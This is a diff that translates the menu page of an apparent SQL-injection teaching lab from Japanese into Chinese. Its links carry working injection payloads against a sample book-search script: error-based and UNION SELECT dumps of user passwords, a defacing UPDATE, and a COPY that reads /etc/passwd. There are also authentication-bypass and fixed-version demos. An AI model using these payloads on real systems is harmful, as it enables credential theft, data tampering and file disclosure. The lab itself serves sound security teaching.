@@ -1,20 +1,20 @@
 <html>
-<head><title>4.4 SQL呼び出しに伴う脆弱性</title></head>
+<head><title>4-4 SQL 调用相关的安全隐患</title></head>
 <body>
-4.4 SQL呼び出しに伴う脆弱性
+4-4 SQL 调用相关的安全隐患
 <ol>
-<li><a href="44-001.php?author=Shakespeare">44-001:蔵書検索(正常系)</a></li>
-<li><a href="44-001.php?author='+and+cast((select+id||':'||pwd+from+users+offset+0+limit+1)+as+integer)>1--">44-001:蔵書検索(エラーメッセージからの情報漏洩)</a></li>
-<li><a href="44-001.php?author=author='+union+select+id,pwd,name,addr,null,null,null+from+users--">44-001:蔵書検索(UNION SELECTを用いた情報漏洩)</a></li>
-<li><a href="44-002.html">44-002:認証画面</a></li>
-<li><a href="44-002a.html">44-002:認証画面(正常系)</a></li>
-<li><a href="44-002b.html">44-002:認証画面(認証回避)</a></li>
-<li><a href="44-001.php?author=';update+books+set+title%3D'<i>cracked!</i>'+where+id%3d'1001'--">44-001:蔵書検索(データ改ざん)</a> <a href="44-001.php?author=Shakespeare">确认</a></li>
-<li><a href="44-001.php?author=';copy+books(title)+from+'/etc/passwd'--">44-001:蔵書検索(ファイル読み出し[1]ファイルの内容をテーブルに)</a></li>
-<li><a href="44-001.php?author='or+author+is+null--">44-001:蔵書検索(ファイル読み出し[2]テーブル参照)</a></li>
-<li><a href="44-004.php?author=Shakespeare">44-004:蔵書検索対策版(正常系)</a></li>
-<li><a href="44-004.php?author='+and+cast((select+id||':'||pwd+from+users+offset+0+limit+1)+as+integer)>1--">44-004:蔵書検索対策版(SQLインジェクション攻撃)</a></li>
-<li><a href="resetdb.php">resetdb:数据库の復旧</a></li>
+<li><a href="44-001.php?author=Shakespeare">44-001:图书搜索(正常情况)</a></li>
+<li><a href="44-001.php?author='+and+cast((select+id||':'||pwd+from+users+offset+0+limit+1)+as+integer)>1--">44-001:图书搜索(基于错误信息的泄露)</a></li>
+<li><a href="44-001.php?author=author='+union+select+id,pwd,name,addr,null,null,null+from+users--">44-001:图书搜索(通过UNION SELECT的信息泄露)</a></li>
+<li><a href="44-002.html">44-002:认证页面</a></li>
+<li><a href="44-002a.html">44-002:认证页面(正常情况)</a></li>
+<li><a href="44-002b.html">44-002:认证页面(跳过认证)</a></li>
+<li><a href="44-001.php?author=';update+books+set+title%3D'<i>cracked!</i>'+where+id%3d'1001'--">44-001:图书搜索(数据篡改)</a> <a href="44-001.php?author=Shakespeare">确认</a></li>
+<li><a href="44-001.php?author=';copy+books(title)+from+'/etc/passwd'--">44-001:图书搜索(读取文件[1]将文件内容保存到表中)</a></li>
+<li><a href="44-001.php?author='or+author+is+null--">44-001:图书搜索(读取文件[2]查看表中数据)</a></li>
+<li><a href="44-004.php?author=Shakespeare">44-004:图书搜索対策版(正常情况)</a></li>
+<li><a href="44-004.php?author='+and+cast((select+id||':'||pwd+from+users+offset+0+limit+1)+as+integer)>1--">44-004:图书搜索対策版(SQL注入攻击)</a></li>
+<li><a href="resetdb.php">resetdb:重置数据库</a></li>
 </ol>
 <br>
 <a href="phpinfo.php">phpinfo</a><br>
